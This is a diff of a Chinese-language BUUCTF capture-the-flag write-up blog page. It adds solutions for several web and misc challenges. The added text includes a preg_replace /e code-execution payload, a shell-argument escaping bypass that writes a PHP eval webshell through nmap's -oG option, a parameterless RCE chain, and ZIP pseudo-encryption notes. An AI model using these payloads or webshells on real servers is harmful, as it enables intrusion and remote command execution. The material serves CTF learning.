@@ -8,7 +8,7 @@
             $whitelist = [&amp;quot;source&amp;quot;=&amp;gt;&amp;quot;source.php&amp;quot;,&amp;quot;hint&amp;quot;=&amp;gt;&amp;quot;hint.php&amp;quot;];
             if (! isset($page) || !is_string($page)) &amp;#123;
                 echo &amp;quot;you can&amp;#39;t s.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
-</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">BUUCTF</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#warmUp1"><span class="toc-text">warmUp1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Include1"><span class="toc-text">Include1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PING-PING-PING"><span class="toc-text">PING PING PING</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easysql"><span class="toc-text">easysql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Secret-File-1"><span class="toc-text">Secret File 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP"><span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-%E5%A4%A7%E5%9D%91"><span class="toc-text">*php   -大坑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-Calc1"><span class="toc-text">Easy Calc1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-MD5-1"><span class="toc-text">Easy MD5 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AreUSerialz"><span class="toc-text">AreUSerialz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Blacklist"><span class="toc-text">Blacklist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-Java"><span class="toc-text">*Easy Java</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">BUUCTF</h1><time class="has-text-grey" datetime="2023-12-04T02:18:32.000Z">2023-12-04</time><article class="mt-2 post-content"><h1 id="warmUp1"><a href="#warmUp1" class="headerlink" title="warmUp1"></a>warmUp1</h1><pre><code>&lt;?php
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">BUUCTF</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#warmUp1"><span class="toc-text">warmUp1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Include1"><span class="toc-text">Include1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PING-PING-PING"><span class="toc-text">PING PING PING</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-text">随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easysql"><span class="toc-text">easysql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Secret-File-1"><span class="toc-text">Secret File 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP"><span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-%E5%A4%A7%E5%9D%91"><span class="toc-text">*php   -大坑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-Calc1"><span class="toc-text">Easy Calc1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-MD5-1"><span class="toc-text">Easy MD5 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AreUSerialz"><span class="toc-text">AreUSerialz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Blacklist"><span class="toc-text">Blacklist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-Java"><span class="toc-text">*Easy Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpweb"><span class="toc-text">phpweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-text">*ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Online-Tool-1"><span class="toc-text">Online Tool 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-text">禁止套娃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc%E2%80%94%E2%80%94%E2%80%94%E2%80%94"><span class="toc-text">misc————</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E9%83%A8%E5%88%86%E7%9A%84flag"><span class="toc-text">两个部分的flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E7%9A%84%E5%BF%AB%E4%B9%90"><span class="toc-text">压缩文件的快乐</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">BUUCTF</h1><time class="has-text-grey" datetime="2023-12-04T02:18:32.000Z">2023-12-04</time><article class="mt-2 post-content"><h1 id="warmUp1"><a href="#warmUp1" class="headerlink" title="warmUp1"></a>warmUp1</h1><pre><code>&lt;?php
     highlight_file(__FILE__);
     class emmm
     &#123;
@@ -149,7 +149,7 @@
 <p><strong>注释：</strong>该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_stristr.asp">stristr()</a> 函数。</p>
 </blockquote>
 <p>直接包含flag.php即可，这里防止目录穿越好像就没了意义。。</p>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231204150728572.png" alt="image-20231204150728572"></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938696.png" alt="image-20231204150728572"></p>
 <p>那就编码一下咯。。</p>
 <pre><code>file=php://filter/read=convert.base64-encode/resource=flag.php
 </code></pre>
@@ -196,7 +196,7 @@ Connection: close
 <h1 id="Easy-Calc1"><a href="#Easy-Calc1" class="headerlink" title="Easy Calc1"></a>Easy Calc1</h1><p>主要是通过ASCII绕过waf</p>
 <p>php中ord把字符串转换为asill，chr反之，它们一次都只能处理一个ascii字符</p>
 <p>scandir可以扫描目录，file_get_contents读取文件内容</p>
-<h1 id="Easy-MD5-1"><a href="#Easy-MD5-1" class="headerlink" title="Easy MD5 1"></a>Easy MD5 1</h1><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231204190813477.png" alt="image-20231204190813477"></p>
+<h1 id="Easy-MD5-1"><a href="#Easy-MD5-1" class="headerlink" title="Easy MD5 1"></a>Easy MD5 1</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938697.png" alt="image-20231204190813477"></p>
 <pre><code>select * from &#39;admin&#39; where password=md5($pass,true)
 </code></pre>
 <p><em>md5(string,raw)</em></p>
@@ -385,9 +385,135 @@ echo serialize($a);
     /WEB-INF/database.properties：数据库配置文件
 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 
 </code></pre>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231205165146499.png" alt="image-20231205165146499"></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938698.png" alt="image-20231205165146499"></p>
 <p>后一步</p>
 <pre><code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class
 </code></pre>
 <p>这里在bp中读取好像可以直接反编译，使用idea等编译器也可以读取到</p>
-</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2023/11/28/MISC-NTA/" title="MISC-NTA"><span class="has-text-weight-semibold">Next: MISC-NTA</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
+<h1 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h1><p>这道题有两个做法可以绕过黑名单，一个是直接 \exec 这样绕过，第二种则是反序列化。这里之所以可以反序列化主要是他提供了一个类，并且析构时可以调用任意方法，此时我们可以指定它执行反序列化，反序列化时的方法不会受到黑名单影响</p>
+<h1 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="*ZJCTF，不过如此"></a>*ZJCTF，不过如此</h1><p>这道题感觉做过，只是next中的函数有变化</p>
+<pre><code>&lt;?php
+$id = $_GET[&#39;id&#39;];
+$_SESSION[&#39;id&#39;] = $id;
+
+function complex($re, $str) &#123;
+    return preg_replace(
+        &#39;/(&#39; . $re . &#39;)/ei&#39;,
+        &#39;strtolower(&quot;\\1&quot;)&#39;,
+        $str
+    );
+&#125;
+
+
+foreach($_GET as $re =&gt; $str) &#123;
+    echo complex($re, $str). &quot;\n&quot;;
+&#125;
+
+function getFlag()&#123;
+    @eval($_GET[&#39;cmd&#39;]);
+&#125;
+</code></pre>
+<blockquote>
+<p>这里的漏洞出在<strong>preg_replace</strong> <strong>&#x2F;e</strong> 模式下</p>
+<p>e模式下的preg_replace可以让第二个参数’替换字符串’当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序，而strtolower(“\1”)正好表达的就是匹配区的第一个（\1&#x3D;\1），从而我们如果匹配可以，则可以将函数实现。<br>比如我们传入 ?.<em>&#x3D;**{${phpinfo()}}*</em></p>
+<p>原句：preg_replace(‘&#x2F;(‘ . $re . ‘)&#x2F;ei’,’strtolower(“\1”)’,$str); 就变成preg_replace(‘&#x2F;(‘ .* ‘)&#x2F;ei’,’strtolower(“\1”)’,<strong>{${phpinfo()}}</strong>);</p>
+<p>又因为$_GET传入首字母是非法字符时候会把  .（点号）改成下划线，因此得将.<em>换成\s</em></p>
+<p>所有payload：?\S*&#x3D;${getFlag()}&amp;cmd&#x3D;system(‘ls &#x2F;‘); </p>
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/l0vehzzz/p/16415836.html">BJDCTF2020]ZJCTF，不过如此 - L0VEhzzz - 博客园 (cnblogs.com)</a></p>
+</blockquote>
+<p>这里的解释比较麻烦，看看这个：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p>
+<p>姑且记住payload：</p>
+<p>\S*&#x3D;${getFlag()}&amp;cmd&#x3D;system(‘ls &#x2F;‘); </p>
+<p>回到这道题，payload1：</p>
+<pre><code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;ls /&#39;); 
+</code></pre>
+<p>通过preg_replace去调用getFlag函数，进一步传参cmd进行命令执行</p>
+<p>payload2：蚁剑连接</p>
+<pre><code>\S*=$&#123;@eval($_POST[cmd])&#125;
+</code></pre>
+<h1 id="Online-Tool-1"><a href="#Online-Tool-1" class="headerlink" title="Online Tool 1"></a>Online Tool 1</h1><p>函数escapeshellarg的作用是把字符串转码为可以在 shell 命令里使用的参数，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p>
+<p>函数escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入： &amp;#;&#96;|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
+<p>参数<code>-oG</code>可以将命令和结果写到同一个文件上</p>
+<p>可以直接传一句话木马</p>
+<pre><code class="php">?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG test.php &#39;
+</code></pre>
+<p>还有一种做法就是直接把命令改成读取flag文件</p>
+<pre><code class="php">?host=&#39; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#39;
+</code></pre>
+<h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h1><p>无参数RCE</p>
+<p>exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
+<pre><code>highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名
+next() 输出数组中的当前元素和下一个元素的值。
+array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)
+scandir() 函数返回指定目录中的文件和目录的数组。
+pos() 输出数组中的当前元素的值。
+localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。
+</code></pre>
+<p>session_id() 可以用来获取&#x2F;设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload</p>
+<pre><code>?exp=highlight_file( session_id(session_start()));
+</code></pre>
+<p>session_id(session_start())<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p>
+<p>抓包：</p>
+<pre><code>cookie: PHPSESSID=flag.php
+</code></pre>
+<h1 id="misc————"><a href="#misc————" class="headerlink" title="misc————"></a>misc————</h1><h1 id="两个部分的flag"><a href="#两个部分的flag" class="headerlink" title="两个部分的flag"></a>两个部分的flag</h1><p>有一部分居然在图片属性里面</p>
+<p>steghide没能提取png的信息，zsteg直接就出来了</p>
+<h1 id="压缩文件的快乐"><a href="#压缩文件的快乐" class="headerlink" title="压缩文件的快乐"></a>压缩文件的快乐</h1><p>这里补充一下伪加密：</p>
+<pre><code>压缩源文件数据区：
+50 4B 03 04：这是头文件标记（0x04034b50）
+14 00：解压文件所需 pkware 版本
+00 00：全局方式位标记（有无加密）
+08 00：压缩方式
+5A 7E：最后修改文件时间
+F7 46：最后修改文件日期
+16 B5 80 14：CRC-32校验（1480B516）
+19 00 00 00：压缩后尺寸（25）
+17 00 00 00：未压缩尺寸（23）
+07 00：文件名长度
+00 00：扩展记录长度
+
+压缩源文件目录区：
+50 4B 01 02：目录中文件文件头标记(0x02014b50)
+3F 00：压缩使用的 pkware 版本
+14 00：解压文件所需 pkware 版本
+00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，当数字为奇数是为加密，为偶数时不加密）
+08 00：压缩方式
+5A 7E：最后修改文件时间
+F7 46：最后修改文件日期
+16 B5 80 14：CRC-32校验（1480B516）
+19 00 00 00：压缩后尺寸（25）
+17 00 00 00：未压缩尺寸（23）
+07 00：文件名长度
+24 00：扩展字段长度
+00 00：文件注释长度
+00 00：磁盘开始号
+00 00：内部文件属性
+20 00 00 00：外部文件属性
+00 00 00 00：局部头部偏移量
+
+压缩源文件目录结束标志：
+50 4B 05 06：目录结束标记
+00 00：当前磁盘编号
+00 00：目录区开始磁盘编号
+01 00：本磁盘上纪录总数
+01 00：目录区中纪录总数
+59 00 00 00：目录区尺寸大小
+3E 00 00 00：目录区对第一张磁盘的偏移量
+00 00：ZIP 文件注释长度
+
+</code></pre>
+<p>我们一般修改的是50 4B 01 02 14 00 01 00 &#x3D;&#x3D;》50 4B 0<code>1</code> 02 14 00 0<code>0</code> 00</p>
+<p>这道题修改伪加密后解压软件报错的话，换成WinRAR或者检查修改位置是否正确</p>
+<p>最后使用明文攻击：</p>
+<pre><code>我们为zip压缩文件所设定的密码，首先被转换成3个32bit的key，所以可能的key的组合是2^96，这是个天文数字
+如果用暴力穷举的方式是不太可能的，除非你的密码比较短或者有个厉害的字典。
+压缩软件用这3个key加密所有包中的文件，也就是说，所有文件的key是一样的，如果我们能够找到这个key，就能解开所有的文件。
+如果我们找到加密压缩包中的任意一个文件，这个文件和压缩包里的文件是一样的
+我们把这个文件用同样的压缩软件同样的压缩方式进行无密码的压缩，得到的文件就是我们的Known plaintext（已知明文）。
+用这个无密码的压缩包和有密码的压缩包进行比较，分析两个包中相同的那个文件，抽取出两个文件的不同点，就是那3个key了，如此就能得到key。
+两个相同文件在压缩包中的字节数应该相差12个byte，就是那3个key了。虽然我们还是无法通过这个key还原出密码，
+但是我们已经可以用这个key解开所有的文件，所以已经满足我们的要求了，毕竟对我们而言，得到解压后的文件比得到密码本身更重要。
+</code></pre>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2023/11/28/MISC-NTA/" title="MISC-NTA"><span class="has-text-weight-semibold">Next: MISC-NTA</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
